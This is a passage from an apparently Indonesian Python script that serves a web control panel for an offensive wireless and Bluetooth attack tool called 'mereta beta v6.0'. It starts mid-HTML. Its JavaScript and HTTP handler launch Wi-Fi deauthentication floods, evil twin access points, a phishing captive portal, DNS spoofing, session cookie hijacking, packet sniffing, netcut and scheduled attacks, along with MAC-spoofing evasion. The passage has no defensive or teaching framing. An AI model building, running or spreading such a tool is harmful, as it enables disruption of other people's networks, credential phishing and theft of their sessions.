<div class="section"><div class="section-title">> netcut (potong koneksi)</div>
<select id="netcutTarget"><option value="">pilih target</option></select>
<input id="netcutDur" value="30" style="width:50px;"> <button id="netcutStartBtn">start</button> <button id="netcutStopBtn">stop</button>
<div id="netcutStatus" class="result-area">not active</div></div>

<div class="section"><div class="section-title">> speed control (geser slider)</div>
<select id="speedTarget"><option value="all">semua device</option></select>
<input type="range" id="speedSlider" class="slider" min="0" max="10240" step="64" value="0">
<div>speed: <span id="speedValue">0</span> kbps (<span id="speedMbps">0</span> mbps)</div>
<button id="speedApply">apply limit</button> <button id="speedRemove">remove limit</button>
<div id="speedStatus" class="result-area">no limit</div></div>

<div class="section"><div class="section-title">> wifi control & schedule</div>
<button id="wifion">wifi on</button> <button id="wifioff">wifi off</button> <button id="apmode">ap mode</button>
<input id="scheduleTime" placeholder="HH:MM" style="width:50px;">
<select id="scheduleType"><option>deauth</option><option>allchannels</option><option>apoverload</option><option>massdeauth</option></select>
<input id="scheduleTarget" placeholder="ssid" style="width:80px;"> <button id="scheduleBtn">schedule</button>
<div id="wifiResult" class="result-area"></div></div>

<div class="section"><div class="section-title">> add new network & log</div>
<input id="newssid" placeholder="ssid" style="width:100px;"> <input id="newpwd" placeholder="password" style="width:80px;"> <button id="addnet">add</button>
<button id="viewLog">view log</button> <button id="exportLog">export log</button>
<div id="logResult" class="result-area"></div></div>

<!-- stop all -->
<div class="section"><button id="stopAllBtn" style="background:#cc0000;color:#fff;">STOP ALL ATTACKS</button>
<div id="stopResult" class="result-area"></div></div>

<div class="footer"><span id="status">ready</span><br><span class="red">*** total destruction mode ***</span></div>
</div>

<script>
async function fetchJson(url, opts={}) { const res = await fetch(url, opts); return res.json(); }
async function loadDevices() {
    const data = await fetchJson('/api/devices');
    if(data.devices) {
        let html = '<option value="">pilih target</option>';
        for(let d of data.devices) html += `<option value="${d.ip}">${d.ip} (${d.type})</option>`;
        document.getElementById('netcutTarget').innerHTML = html;
        let html2 = '<option value="all">semua device</option>';
        for(let d of data.devices) html2 += `<option value="${d.ip}">${d.ip} (${d.type})</option>`;
        document.getElementById('speedTarget').innerHTML = html2;
        let html3 = '<option value="">pilih ip</option>';
        for(let d of data.devices) html3 += `<option value="${d.ip}">${d.ip} (${d.type})</option>`;
        document.getElementById('graphTarget').innerHTML = html3;
    }
}
async function loadWifi() {
    const data = await fetchJson('/api/scan');
    if(data.networks) {
        let html = '<option value="broadcast">broadcast (semua wifi)</option>';
        for(let n of data.networks) if(n.ssid) html += `<option value="${n.ssid}">${n.ssid}</option>`;
        document.getElementById('deauthTarget').innerHTML = html;
        document.getElementById('allchTarget').innerHTML = html;
        document.getElementById('apoverTarget').innerHTML = html;
    }
}
// evasion
document.getElementById('macbtn').onclick = async () => { const d=await fetchJson('/api/mac/change'); document.getElementById('evasionResult').innerHTML=`<div class="result-line">new mac: ${d.mac}</div>`; document.getElementById('currentMac').innerText=d.current; };
document.getElementById('stealthOn').onclick = async () => { await fetch('/api/stealth/on'); document.getElementById('evasionResult').innerHTML='<div class="result-line">stealth mode ON</div>'; };
document.getElementById('stealthOff').onclick = async () => { await fetch('/api/stealth/off'); document.getElementById('evasionResult').innerHTML='<div class="result-line">stealth mode OFF</div>'; };
document.getElementById('ssidBtn').onclick = async () => { const ssid=document.getElementById('fakeSsid').value||"Xiaomi_Device"; await fetch(`/api/spoof/ssid?ssid=${ssid}`); document.getElementById('evasionResult').innerHTML=`<div class="result-line">ssid spoofed to: ${ssid}</div>`; };
document.getElementById('darkmodeBtn').onclick = async () => { const d=await fetchJson('/api/darkmode/toggle'); location.reload(); };
// recon
document.getElementById('scanWifiBtn').onclick = async () => { await loadWifi(); document.getElementById('reconResult').innerHTML='<div class="result-line">wifi scan complete</div>'; };
document.getElementById('scanDeviceBtn').onclick = async () => { const d=await fetchJson('/api/devices'); document.getElementById('reconResult').innerHTML=`<div class="result-line">${d.devices.length} devices found</div>`; await loadDevices(); };
document.getElementById('wpsScanBtn').onclick = async () => { const d=await fetchJson('/api/wps/scan'); document.getElementById('reconResult').innerHTML=`<div class="result-line">wps scan: ${d.devices.length} devices</div>`; };
document.getElementById('fingerprintBtn').onclick = async () => { const target=document.getElementById('netcutTarget').value; if(!target) return; const d=await fetchJson(`/api/fingerprint?ip=${target}`); document.getElementById('reconResult').innerHTML=`<div class="result-line">${target} OS: ${d.os}</div>`; };
document.getElementById('vulnBtn').onclick = async () => { const target=document.getElementById('netcutTarget').value; if(!target) return; const d=await fetchJson(`/api/vuln?ip=${target}`); document.getElementById('reconResult').innerHTML=`<div class="result-line">${d.vulns.length} vulnerabilities</div>`; };
document.getElementById('mapBtn').onclick = async () => { const d=await fetchJson('/api/map'); document.getElementById('reconResult').innerHTML=`<pre>${d.map}</pre>`; };
document.getElementById('snifferBtn').onclick = async () => { const d=await fetchJson('/api/sniffer'); document.getElementById('reconResult').innerHTML=`<div class="result-line">captured ${d.count} packets</div>`; };
document.getElementById('sessionBtn').onclick = async () => { const target=document.getElementById('netcutTarget').value; if(!target) return; const d=await fetchJson(`/api/session?ip=${target}`); document.getElementById('reconResult').innerHTML=`<div class="result-line">found ${d.cookies.length} cookies</div>`; };
// graph
document.getElementById('graphBtn').onclick = async () => { const ip=document.getElementById('graphTarget').value; if(!ip) return; const d=await fetchJson(`/api/graph?ip=${ip}`); document.getElementById('graphResult').innerHTML=`<div class="result-line">graph generated: ${d.file}</div><img src="/api/graph/image?file=${d.file}" width="100%">`; };
// dns spoof
document.getElementById('dnsStart').onclick = async () => { const domain=document.getElementById('dnsDomain').value, redirect=document.getElementById('dnsRedirect').value; if(!domain) return; await fetch(`/api/dns/start?domain=${domain}&redirect=${redirect}`); document.getElementById('dnsResult').innerHTML=`<div class="result-line">dns spoof active: ${domain} -> ${redirect}</div>`; };
document.getElementById('dnsStop').onclick = async () => { await fetch('/api/dns/stop'); document.getElementById('dnsResult').innerHTML='<div class="result-line">dns spoof stopped</div>'; };
// captive portal
document.getElementById('portalStart').onclick = async () => { const ssid=document.getElementById('portalSsid').value||"Free_WiFi"; await fetch(`/api/portal/start?ssid=${ssid}`); document.getElementById('portalResult').innerHTML=`<div class="result-line">captive portal active: ${ssid}</div>`; };
document.getElementById('portalStop').onclick = async () => { await fetch('/api/portal/stop'); document.getElementById('portalResult').innerHTML='<div class="result-line">captive portal stopped</div>'; };
// attack terpisah (sama seperti sebelumnya)
document.getElementById('deauthBtn').onclick = async () => { const t=document.getElementById('deauthTarget').value, d=document.getElementById('deauthDur').value; await fetch(`/api/attack/deauth?duration=${d}&target=${t}`); document.getElementById('deauthStatus').innerHTML=`<div class="result-line red">deauth active: ${t} (${d}s)</div>`; setTimeout(()=>document.getElementById('deauthStatus').innerHTML='<div class="result-line">idle</div>',d*1000); };
document.getElementById('allchBtn').onclick = async () => { const t=document.getElementById('allchTarget').value, d=document.getElementById('allchDur').value; await fetch(`/api/attack/allchannels?duration=${d}&target=${t}`); document.getElementById('allchStatus').innerHTML=`<div class="result-line red">all channels active: ${t} (${d}s)</div>`; setTimeout(()=>document.getElementById('allchStatus').innerHTML='<div class="result-line">idle</div>',d*1000); };
document.getElementById('apoverBtn').onclick = async () => { const t=document.getElementById('apoverTarget').value, d=document.getElementById('apoverDur').value; await fetch(`/api/attack/apoverload?duration=${d}&target=${t}`); document.getElementById('apoverStatus').innerHTML=`<div class="result-line red">ap overload active: ${t} (${d}s)</div>`; setTimeout(()=>document.getElementById('apoverStatus').innerHTML='<div class="result-line">idle</div>',d*1000); };
document.getElementById('massBtn').onclick = async () => { const d=document.getElementById('massDur').value; await fetch(`/api/attack/massdeauth?duration=${d}`); document.getElementById('massStatus').innerHTML=`<div class="result-line red">mass deauth active (${d}s)</div>`; setTimeout(()=>document.getElementById('massStatus').innerHTML='<div class="result-line">idle</div>',d*1000); };
document.getElementById('probeBtn').onclick = async () => { const d=document.getElementById('probeDur').value; await fetch(`/api/attack/probeflood?duration=${d}`); document.getElementById('probeStatus').innerHTML=`<div class="result-line red">probe flood active (${d}s)</div>`; setTimeout(()=>document.getElementById('probeStatus').innerHTML='<div class="result-line">idle</div>',d*1000); };
document.getElementById('authBtn').onclick = async () => { const d=document.getElementById('authDur').value; await fetch(`/api/attack/authflood?duration=${d}`); document.getElementById('authStatus').innerHTML=`<div class="result-line red">auth flood active (${d}s)</div>`; setTimeout(()=>document.getElementById('authStatus').innerHTML='<div class="result-line">idle</div>',d*1000); };
document.getElementById('evilStart').onclick = async () => { const ssid=document.getElementById('evilSsid').value; if(!ssid) return; await fetch(`/api/evil/start?ssid=${ssid}`); document.getElementById('evilResult').innerHTML=`<div class="result-line red">evil twin active: ${ssid}</div>`; };
document.getElementById('evilStop').onclick = async () => { await fetch('/api/evil/stop'); document.getElementById('evilResult').innerHTML='<div class="result-line">evil twin stopped</div>'; };
document.getElementById('btStart').onclick = async () => { const d=document.getElementById('btDur').value; await fetch(`/api/attack/bluetooth?duration=${d}`); document.getElementById('btResult').innerHTML=`<div class="result-line red">bt brutal active (${d}s)</div>`; setTimeout(()=>document.getElementById('btResult').innerHTML='<div class="result-line">idle</div>',d*1000); };
document.getElementById('btStop').onclick = async () => { await fetch('/api/stop'); document.getElementById('btResult').innerHTML='<div class="result-line">stopped</div>'; };
document.getElementById('btScanBtn').onclick = async () => { const d=await fetchJson('/api/bt/scan'); if(d.devices){ let html=''; for(let b of d.devices.slice(0,5)) html+=`<div class="result-line">${b.mac} - ${b.name}</div>`; document.getElementById('btSpamResult').innerHTML=html; let opts='<option>pilih bt device</option>'; for(let b of d.devices) opts+=`<option value="${b.mac}">${b.mac}</option>`; document.getElementById('btTarget').innerHTML=opts; } };
document.getElementById('btSpamStart').onclick = async () => { const mac=document.getElementById('btTarget').value; if(!mac||mac==='pilih bt device') return; await fetch(`/api/bt/spam/start?mac=${mac}`); document.getElementById('btSpamResult').innerHTML=`<div class="result-line">spamming: ${mac}</div>`; };
document.getElementById('btSpamStop').onclick = async () => { await fetch('/api/bt/spam/stop'); document.getElementById('btSpamResult').innerHTML='<div class="result-line">spam stopped</div>'; };
document.getElementById('netcutStartBtn').onclick = async () => { const t=document.getElementById('netcutTarget').value, d=document.getElementById('netcutDur').value; if(!t) return; await fetch(`/api/netcut/start?target=${t}&duration=${d}`); document.getElementById('netcutStatus').innerHTML=`<div class="result-line">netcut active: ${t} (${d}s)</div>`; setTimeout(()=>document.getElementById('netcutStatus').innerHTML='<div class="result-line">not active</div>',d*1000); };
document.getElementById('netcutStopBtn').onclick = async () => { await fetch('/api/netcut/stop'); document.getElementById('netcutStatus').innerHTML='<div class="result-line">netcut stopped</div>'; };
const slider=document.getElementById('speedSlider'); slider.oninput=()=>{let v=slider.value; document.getElementById('speedValue').innerText=v; document.getElementById('speedMbps').innerText=(v/1024).toFixed(1);};
document.getElementById('speedApply').onclick = async () => { const t=document.getElementById('speedTarget').value, s=slider.value; await fetch(`/api/speed/apply?target=${t}&speed=${s}`); document.getElementById('speedStatus').innerHTML=`<div class="result-line">limit: ${s} kbps untuk ${t}</div>`; };
document.getElementById('speedRemove').onclick = async () => { await fetch('/api/speed/remove'); document.getElementById('speedStatus').innerHTML='<div class="result-line">no limit</div>'; slider.value=0; };
document.getElementById('wifion').onclick = async () => { await fetch('/api/wifi/on'); document.getElementById('wifiResult').innerHTML='<div class="result-line">wifi on</div>'; };
document.getElementById('wifioff').onclick = async () => { await fetch('/api/wifi/off'); document.getElementById('wifiResult').innerHTML='<div class="result-line">wifi off</div>'; };
document.getElementById('apmode').onclick = async () => { await fetch('/api/ap'); document.getElementById('wifiResult').innerHTML='<div class="result-line">ap mode: MERETA</div>'; };
document.getElementById('scheduleBtn').onclick = async () => { const time=document.getElementById('scheduleTime').value, type=document.getElementById('scheduleType').value, target=document.getElementById('scheduleTarget').value; await fetch(`/api/schedule/add?time=${time}&type=${type}&target=${target}`); document.getElementById('wifiResult').innerHTML=`<div class="result-line">scheduled: ${type} on ${target} at ${time}</div>`; };
document.getElementById('addnet').onclick = async () => { const ssid=document.getElementById('newssid').value, pwd=document.getElementById('newpwd').value; if(!ssid||!pwd) return; const d=await fetchJson('/api/add',{method:'POST',body:JSON.stringify({ssid,pwd})}); document.getElementById('logResult').innerHTML=`<div class="result-line">${d.status}</div>`; };
document.getElementById('viewLog').onclick = async () => { const d=await fetchJson('/api/log/view'); if(d.log&&d.log.length){ let html=''; for(let l of d.log.slice(-5)) html+=`<div class="result-line">${l.time.substring(5,16)} - ${l.attack} -> ${l.target}</div>`; document.getElementById('logResult').innerHTML=html; } else document.getElementById('logResult').innerHTML='<div class="result-line">no logs</div>'; };
document.getElementById('exportLog').onclick = async () => { const d=await fetchJson('/api/log/export'); document.getElementById('logResult').innerHTML=`<div class="result-line">exported: ${d.file}</div>`; };
document.getElementById('stopAllBtn').onclick = async () => { await fetch('/api/stop'); document.getElementById('stopResult').innerHTML='<div class="result-line">all attacks stopped</div>'; };
async function updateStatus(){ const d=await fetchJson('/api/status'); const m=await fetchJson('/api/mac/current'); document.getElementById('currentMac').innerText=m.mac; }
setInterval(updateStatus,3000); loadDevices(); loadWifi(); updateStatus();
</script>
</body>
</html>'''

class handler(BaseHTTPRequestHandler):
    def log_message(self, *args, **kwargs): pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200); self.send_header('content-type', 'text/html'); self.end_headers()
            self.wfile.write(html_page.encode())
        elif self.path == '/api/status':
            self.send_json({'current_attack': current_attack, 'running': attack_running})
        elif self.path == '/api/mac/current':
            self.send_json({'mac': get_current_mac()})
        elif self.path == '/api/mac/change':
            new_mac = change_mac()
            self.send_json({'mac': new_mac, 'current': get_current_mac()})
        elif self.path == '/api/stealth/on':
            set_stealth_mode(True); self.send_json({'status': 'on'})
        elif self.path == '/api/stealth/off':
            set_stealth_mode(False); self.send_json({'status': 'off'})
        elif self.path.startswith('/api/spoof/ssid'):
            ssid = self.path.split('ssid=')[1] if 'ssid=' in self.path else 'Xiaomi_Device'
            spoof_ssid(ssid); self.send_json({'status': 'done'})
        elif self.path == '/api/darkmode/toggle':
            toggle_dark_mode(); self.send_json({'dark_mode': dark_mode})
        elif self.path == '/api/wps/scan':
            self.send_json({'devices': wps_scan()})
        elif self.path.startswith('/api/fingerprint'):
            ip = self.path.split('ip=')[1] if 'ip=' in self.path else ''
            self.send_json({'os': fingerprint_os(ip) if ip else 'unknown'})
        elif self.path.startswith('/api/vuln'):
            ip = self.path.split('ip=')[1] if 'ip=' in self.path else ''
            self.send_json({'vulns': vuln_scan(ip) if ip else []})
        elif self.path == '/api/map':
            self.send_json({'map': get_network_map()})
        elif self.path == '/api/sniffer':
            data = start_packet_sniffer()
            self.send_json({'count': len(data)})
        elif self.path.startswith('/api/session'):
            ip = self.path.split('ip=')[1] if 'ip=' in self.path else ''
            cookies = session_hijack(ip) if ip else []
            self.send_json({'cookies': cookies})
        elif self.path.startswith('/api/graph'):
            ip = self.path.split('ip=')[1] if 'ip=' in self.path else ''
            if ip:
                file = generate_signal_graph(ip)
                self.send_json({'file': file})
            else:
                self.send_json({'file': None})
        elif self.path.startswith('/api/graph/image'):
            file = self.path.split('file=')[1] if 'file=' in self.path else ''
            if file and os.path.exists(file):
                with open(file, 'rb') as f:
                    self.send_response(200)
                    self.send_header('content-type', 'image/png')
                    self.end_headers()
                    self.wfile.write(f.read())
                return
            self.send_response(404)
        elif self.path.startswith('/api/dns/start'):
            domain = self.path.split('domain=')[1].split('&')[0] if 'domain=' in self.path else ''
            redirect = self.path.split('redirect=')[1] if 'redirect=' in self.path else '192.168.1.1'
            if domain:
                start_dns_spoof(domain, redirect)
            self.send_json({'status': 'started'})
        elif self.path == '/api/dns/stop':
            stop_dns_spoof(); self.send_json({'status': 'stopped'})
        elif self.path.startswith('/api/portal/start'):
            ssid = self.path.split('ssid=')[1] if 'ssid=' in self.path else 'Free_WiFi'
            start_captive_portal(ssid); self.send_json({'status': 'started'})
        elif self.path == '/api/portal/stop':
            stop_captive_portal(); self.send_json({'status': 'stopped'})
        elif self.path == '/api/scan':
            self.send_json({'networks': scan_wifi_networks()})
        elif self.path == '/api/devices':
            self.send_json({'devices': device_scan()})
        elif self.path.startswith('/api/attack/deauth'):
            dur = int(self.path.split('duration=')[1].split('&')[0]) if 'duration=' in self.path else 30
            target = self.path.split('target=')[1] if 'target=' in self.path else 'broadcast'
            threading.Thread(target=start_deauth_brutal, args=(dur, target)).start()
            self.send_json({'status': 'started'})
        elif self.path.startswith('/api/attack/allchannels'):
            dur = int(self.path.split('duration=')[1].split('&')[0]) if 'duration=' in self.path else 30
            target = self.path.split('target=')[1] if 'target=' in self.path else 'broadcast'
            threading.Thread(target=start_all_channels, args=(dur, target)).start()
            self.send_json({'status': 'started'})
        elif self.path.startswith('/api/attack/apoverload'):
            dur = int(self.path.split('duration=')[1].split('&')[0]) if 'duration=' in self.path else 30
            target = self.path.split('target=')[1] if 'target=' in self.path else 'broadcast'
            threading.Thread(target=start_ap_overload, args=(dur, target)).start()
            self.send_json({'status': 'started'})
        elif self.path.startswith('/api/attack/massdeauth'):
            dur = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_mass_deauth, args=(dur,)).start()
            self.send_json({'status': 'started'})
        elif self.path.startswith('/api/attack/probeflood'):
            dur = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_probe_flood, args=(dur,)).start()
            self.send_json({'status': 'started'})
        elif self.path.startswith('/api/attack/authflood'):
            dur = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_auth_flood, args=(dur,)).start()
            self.send_json({'status': 'started'})
        elif self.path.startswith('/api/attack/bluetooth'):
            dur = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_bluetooth_brutal, args=(dur,)).start()
            self.send_json({'status': 'started'})
        elif self.path.startswith('/api/evil/start'):
            ssid = self.path.split('ssid=')[1] if 'ssid=' in self.path else 'free_wifi'
            threading.Thread(target=start_evil_twin, args=(ssid,)).start()
            self.send_json({'status': 'started', 'ssid': ssid})
        elif self.path == '/api/evil/stop':
            stop_evil_twin(); self.send_json({'status': 'stopped'})
        elif self.path == '/api/bt/scan':
            self.send_json({'devices': scan_bluetooth()})
        elif self.path.startswith('/api/bt/spam/start'):
            mac = self.path.split('mac=')[1] if 'mac=' in self.path else ''
            if mac: bt_spam_pairing_start(mac)
            self.send_json({'status': 'started'})
        elif self.path == '/api/bt/spam/stop':
            bt_spam_pairing_stop(); self.send_json({'status': 'stopped'})
        elif self.path.startswith('/api/netcut/start'):
            target = self.path.split('target=')[1].split('&')[0] if 'target=' in self.path else ''
            duration = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            if target: threading.Thread(target=netcut_start, args=(target, duration)).start()
            self.send_json({'status': 'started'})
        elif self.path == '/api/netcut/stop':
            netcut_stop(); self.send_json({'status': 'stopped'})
        elif self.path.startswith('/api/speed/apply'):
            target = self.path.split('target=')[1].split('&')[0] if 'target=' in self.path else 'all'
            speed = int(self.path.split('speed=')[1]) if 'speed=' in self.path else 0
            if target == 'all': apply_speed_to_all(speed)
            else: set_speed_limit(target, speed)
            self.send_json({'status': 'applied'})
        elif self.path == '/api/speed/remove':
            remove_speed_limit(); self.send_json({'status': 'removed'})
        elif self.path == '/api/wifi/on':
            set_wifi_on(True); self.send_json({'status': 'on'})
        elif self.path == '/api/wifi/off':
            set_wifi_on(False); self.send_json({'status': 'off'})
        elif self.path == '/api/ap':
            enable_ap_mode(); self.send_json({'status': 'ap_mode_on'})
        elif self.path == '/api/log/view':
            self.send_json({'log': get_attack_log()})
        elif self.path == '/api/log/export':
            file = export_log()
            self.send_json({'file': file})
        elif self.path.startswith('/api/schedule/add'):
            time_str = self.path.split('time=')[1].split('&')[0] if 'time=' in self.path else '00:00'
            atype = self.path.split('type=')[1].split('&')[0] if 'type=' in self.path else 'deauth'
            target = self.path.split('target=')[1] if 'target=' in self.path else 'broadcast'
            schedule_attack(atype, target, 30, time_str); self.send_json({'status': 'scheduled'})
        elif self.path == '/api/stop':
            stop_all(); self.send_json({'status': 'stopped'})
        else: self.send_response(404); self.end_headers()
    
    def do_POST(self):
        if self.path == '/api/add':
            length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(length))
            add_wifi_network(data.get('ssid',''), data.get('pwd',''))
            self.send_json({'status': f"network {data.get('ssid','')} added"})
        else: self.send_response(404); self.end_headers()
    
    def send_json(self, data):
        self.send_response(200); self.send_header('content-type', 'application/json'); self.end_headers()
        self.wfile.write(json.dumps(data).encode())

if __name__ == '__main__':
    os.system('clear')
    print('\033[91m╔════════════════════════════════════════════╗')
    print('║              mereta beta v6.0                  ║')
    print('║         ultimate - 38 fitur lengkap            ║')
    print('║  fitur baru: dns spoof | captive portal | packet sniffer | session hijack | realtime graph | dark mode')
    print('╚════════════════════════════════════════════╝\033[0m')
    os.system(f"sudo ifconfig {interface} up 2>/dev/null")
    local_ip = get_ip()
    print(f'\n\033[91m[!]\033[0m server: http://{local_ip}:8080')
    print(f'\n\033[91m[!]\033[0m FITUR LENGKAP 38:')
    print(f'\033[91m    - evasion: mac changer, stealth mode, ssid spoofing, dark mode')
    print(f'\033[91m    - recon: wifi scan, device scan, wps scan, os fingerprint, vuln scan, network map, packet sniffer, session hijack')
    print(f'\033[91m    - attack: deauth, all channels, ap overload, mass deauth, probe flood, auth flood')
    print(f'\033[91m    - attack: evil twin, bt brutal, bt spam, netcut, speed control')
    print(f'\033[91m    - post-attack: dns spoof, captive portal (phishing), realtime graph')
    print(f'\033[91m    - utility: wifi on/off, ap mode, add network, schedule attack, log export')
    print(f'\033[91m[!]\033[0m press ctrl+c to stop\n')
    server = HTTPServer(('0.0.0.0', 8080), handler)
    try: server.serve_forever()
    except KeyboardInterrupt: print('\n\033[91m[!]\033[0m terminated'); server.shutdown() 
